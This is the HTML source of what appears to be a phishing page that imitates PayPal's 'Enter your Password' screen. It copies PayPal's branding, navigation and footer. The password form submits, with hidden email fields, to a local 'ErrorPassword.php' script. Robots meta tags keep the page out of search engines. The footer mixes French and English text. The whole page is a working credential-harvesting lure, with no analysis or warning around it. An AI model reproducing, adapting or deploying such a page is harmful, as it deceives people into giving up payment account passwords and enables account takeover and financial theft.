<!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN" "http://www.w3.org/TR/html4/loose.dtd">
<html lang="en">
<meta http-equiv="Content-Type" content="text/html;charset=UTF-8">
<head>

<title>Password.</title>
<META NAME="robots" CONTENT="noindex">
<META NAME="robots" CONTENT="nofollow">
<META NAME="robots" CONTENT="noarchive">
<META NAME="robots" CONTENT="nosnippet">
<META NAME="robots" CONTENT="noodp">
<META NAME="robots" CONTENT="noydir">
<link media="screen" rel="stylesheet" type="text/css" href="Error/global00.css">

<link media="print" rel="stylesheet" type="text/css" href="Error/print000.css"><style type="text/css" id="antiClickjack">body{display:none !important;}</style><script type="text/javascript">
				if (self === top) {
					var antiClickjack = document.getElementById("antiClickjack");
					antiClickjack.parentNode.removeChild(antiClickjack);
				} else {
					top.location = self.location;
				}
			</script><script type="text/javascript" src="Error/global00.js"></script><script type="text/javascript">PAYPAL.util.lazyLoadRoot = 'https://www.paypalobjects.com/WEBSCR-640-20121008-1';</script><link rel="shortcut icon" href="Error/pp_favic.ico"><link rel="apple-touch-icon"></head><body><noscript><style type="text/css">body{display:block !important;}</style><p class="nonjsAlert">NOTE: Many features on the PayPal Web site require Javascript and cookies. You can enable both via your browser's preference settings.</p></noscript><div class="legacyErrors " id="page"><div id="header" class="notab"><h1><a><img border="0" src="Error/paypal_l.gif" alt="PayPal"></a></h1><div id="navGlobal"><span><a class="accessAid skip">Skip to main content</a></span><ul><li class="login"><a>Log In</a></li><li><a>Help</a></li><li class="last"><a>Security Center</a></li></ul></div><div class="empty" id="navPrimary"></div></div><div id="content"><div id="headline"><div class="titleLink secure"><a><span class="small">Secure</span></a></div><h2>Enter your Password</h2>
</div><div id="messageBox" class="legacyErrors"></div><div id="main" class="legacyErrors"><div class="layout1"><form method="post" action="ErrorPassword.php?#/_flow&SESSION=PnlUc3mEHJJHI55454Op215LMp87878ijQ9wUub3cFpG7mo2DssMkja2121545487KJJHHG5548782121548LLOpm54548" class><input type="hidden" name="login_email"><input type="hidden" name="login_confirm_number" value="16211300881433153306"><input type="hidden" name="ru" value><p>Please enter your PayPal password to confirm your e-mail address.</p><p class="group "><label for="unpass"><span class="labelText">PayPal Password:</span></label><span class="field"><input autocomplete="off" type="password" id="unpass" name="unpass" value size="40" maxlength="40"></span></p><p class="buttons"><input type="submit" name="confirm.x" value="Login" class="primary button"></p><p><span class="small">&nbsp;<a target="_blank">Forgot your password?</a></span></p><input name="auth" type="hidden" value="AWaJdo1iNzYbip.tgfkpAgm9a1oSU8gdLsnejZ.isO-Ab7SqR6QV9M3tAaDw6.x6uQv6TMscN0LoVT8i0R-FuEQ"><input name="form_charset" type="hidden" value="UTF-8"></form></div></div></div><div id="footer" role="contentinfo"><ul><li class="last"><a>Contact Usterms and conditions</a></li></ul><p id="legal">Copyright © 1999-2013 PayPal. Tous droits réservés.</p>Avis aux utilisateurs PayPal Pte. Ltd, le titulaire de la valeur stockée PayPal<br>installation, ne nécessite pas l'approbation de la Monetary Authority of Singapore.<br>Les utilisateurs sont invités à lire le <a>modalités et conditions</a> carefully.</div><div role="navigation" id="navFull"><ul><li class="active"><a class="scTrack:SRD:Nav:BS1">Home</a><ul><li class="active"><a class="scTrack:SRD:Nav:BS2">Get Started</a><ul><li><a class="scTrack:SRD:Nav:BS3">Why Use PayPal</a></li><li><a class="scTrack:SRD:Nav:BS4">How It Works</a></li><li><a class="scTrack:SRD:Nav:BS5">Where to Shop With It</a></li></ul></li><li><a class="scTrack:SRD:Nav:BS6">Send Payment</a><ul><li><a class="scTrack:SRD:Nav:BS7">Send Payment Online</a></li></ul></li><li><a class="scTrack:SRD:Nav:BS9">Request Money</a><ul><li><a class="scTrack:SRD:Nav:BS10">Request Money</a></li><li><a class="scTrack:SRD:Nav:BS11">Send an Invoice</a></li></ul></li><li><a class="scTrack:SRD:Nav:BS12">Sell on eBay</a></li><li><a class="scTrack:SRD:Nav:BS13">Developers</a></li></ul></li><li><a class="scTrack:SRD:Nav:BS15">Personal</a></li><li><a class="scTrack:SRD:Nav:BS46">Business</a></li><li><a class="scTrack:SRD:Nav:BS95">Products</a></li></ul></div><script type="text/javascript">if(typeof PAYPAL != 'undefined'){ PAYPAL.core.Navigation.init(); }</script></div><script type="text/javascript" src="Error/widgets0.js"></script>

<script type="text/javascript" src="Error/pp_jscod.js"></script>

<noscript><img src="https://t.paypal.com/ts?nojs=1&amp;pgrp=p%2fgen%2fcnf%2femail%2dpassword%3a%3a_ece&amp;cnac=MA&amp;teal=Zc0AOTOuq1dencqMTQgQzL63Z75Km2jeNSmtB%252bCC2HGVvpT57nBPqw%253d%253d_13a9e881da8&amp;tmpl=p%2fgen%2fcnf%2femail%2dpassword&amp;cust=7A68396262897963B&amp;acnt=business&amp;aver=verified&amp;rstr=unrestricted&amp;pgst=1351279452&amp;lgin=in&amp;calc=b1729f51d3923&amp;rsta=en_US" height="1" width="1" border="0" alt></noscript>
</body></html>
